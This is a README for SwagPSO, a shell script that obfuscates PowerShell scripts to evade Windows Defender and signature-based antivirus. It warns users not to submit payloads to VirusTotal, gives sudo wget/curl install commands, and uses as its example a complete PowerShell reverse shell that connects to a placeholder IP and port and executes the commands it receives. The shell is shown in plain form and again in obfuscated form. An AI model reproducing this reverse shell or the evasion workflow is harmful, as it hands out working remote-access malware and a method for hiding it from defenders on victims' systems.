#### NOTE: DO NOT test your payloads by uploading to virustotal or similar services unless you want them to be finger printed and become ineffective.
# Swag PSO
swag powershell obfuscator

## Install
using wget
```bash
sudo bash -c "wget https://raw.githubusercontent.com/1337Rin/Swag-PSO/main/swagpso.sh -O /usr/bin/swagpso && chmod 755 /usr/bin/swagpso"
```
using curl
```bash
sudo bash -c "curl https://raw.githubusercontent.com/1337Rin/Swag-PSO/main/swagpso.sh > /usr/bin/swagpso && chmod 755 /usr/bin/swagpso"
```

## Description
SwagPSO is a simple shell script to help obfuscate powershell scripts in order to bypass Windows Defender and other signature based AV. SwagPSO only focuses on automating obfuscation techniques that would be tedious to do by hand and therefore should not be the only tool used in the obfuscation process. Additionally it may break programs depending on their complexity and is thus better suited for simple scripts. It currently supports 5 tecniques.
* renaming functions
* renaming variables
* randomizing capatalization
* adding junk comments
* replacing "\n" with ;

## Example
using SwagPSO...
```powershell
$socket = new-object System.Net.Sockets.TcpClient("<IP>",<PORT>);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
    $writer.Write("[new]> ");
    $writer.Flush();
    $read = $null;
    while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
    $out = $encoding.GetString($buffer, 0, $read).Replace("rn","").Replace("`n","");
    if(!$out.equals("exit")){
        $out = $out.split()
            $res = [string](&$out[0] $out[1..$out.length]);
        if($res -ne $null){ $writer.WriteLine($res)}
    }
}While (!$out.equals("exit"))
$writer.close();$socket.close();
```
would become...
```powershell
$babys_first_programmWN1BRx7SjcmX7jRPncH = neW-oBJeCt systeM.net.soCKets.tCpClient("<ip>",<port>);<#fhzbi#>;if($babys_first_programmWN1BRx7SjcmX7jRPncH -eq $babys_first_programYbkv5RJpgIyTNDnEYU5k){eXit 1};$babys_first_programZe3M3kaGXgLr86LFV4aQ = $babys_first_programmWN1BRx7SjcmX7jRPncH.GetstreaM();<#fhzbi#>;$babys_first_programrEtlVoFT8BpA8C9Oyijq = neW-oBJeCt systeM.io.streaMWriter($babys_first_programZe3M3kaGXgLr86LFV4aQ);<#fhzbi#>;$babys_first_program9tYZO5jojGkbSgB36qw7 = neW-oBJeCt systeM.Byte[] 1024;<#fhzbi#>;$babys_first_program60fXu3maa4rL2uATEbrR = neW-oBJeCt systeM.teXt.asCiienCodinG;<#fhzbi#>;do{; $babys_first_programrEtlVoFT8BpA8C9Oyijq.Write("[neW]> ");<#fhzbi#>; $babys_first_programrEtlVoFT8BpA8C9Oyijq.flUsh();<#fhzbi#>; $babys_first_programPf3xEva5bv3rjpPPcY0Q = $babys_first_programYbkv5RJpgIyTNDnEYU5k;<#fhzbi#>; While($babys_first_programZe3M3kaGXgLr86LFV4aQ.dataaVailaBle -or ($babys_first_programPf3xEva5bv3rjpPPcY0Q = $babys_first_programZe3M3kaGXgLr86LFV4aQ.read($babys_first_program9tYZO5jojGkbSgB36qw7, 0, 1024)) -eq $babys_first_programYbkv5RJpgIyTNDnEYU5k){}; $babys_first_programLesW7SueU7yb0fUEvgau = $babys_first_program60fXu3maa4rL2uATEbrR.GetstrinG($babys_first_program9tYZO5jojGkbSgB36qw7, 0, $babys_first_programPf3xEva5bv3rjpPPcY0Q).replaCe("rn","").replaCe("`n","");<#fhzbi#>; if(!$babys_first_programLesW7SueU7yb0fUEvgau.eqUals("eXit")){; $babys_first_programLesW7SueU7yb0fUEvgau = $babys_first_programLesW7SueU7yb0fUEvgau.split(); $babys_first_programekuoBqPcZzisObyVeYUD = [strinG](&$babys_first_programLesW7SueU7yb0fUEvgau[0] $babys_first_programLesW7SueU7yb0fUEvgau[1..$babys_first_programLesW7SueU7yb0fUEvgau.lenGth]);<#fhzbi#>; if($babys_first_programekuoBqPcZzisObyVeYUD -ne $babys_first_programYbkv5RJpgIyTNDnEYU5k){ $babys_first_programrEtlVoFT8BpA8C9Oyijq.Writeline($babys_first_programekuoBqPcZzisObyVeYUD)}; };}While (!$babys_first_programLesW7SueU7yb0fUEvgau.eqUals("eXit"));$babys_first_programrEtlVoFT8BpA8C9Oyijq.Close();<#fhzbi#>$babys_first_programmWN1BRx7SjcmX7jRPncH.Close();<#fhzbi#>;
```
